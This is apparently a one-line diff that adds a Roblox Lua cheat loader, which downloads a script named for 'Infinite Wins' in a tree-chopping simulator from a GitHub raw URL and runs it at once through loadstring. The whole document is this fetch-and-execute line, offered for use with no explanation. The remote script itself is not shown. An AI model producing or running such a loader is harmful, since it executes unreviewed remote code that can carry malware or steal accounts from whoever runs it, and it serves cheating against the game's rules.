@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rah-Md/Script-Tree-Chop-Simulator-Op/main/Infinite%20Wins%20More%20lua"))()
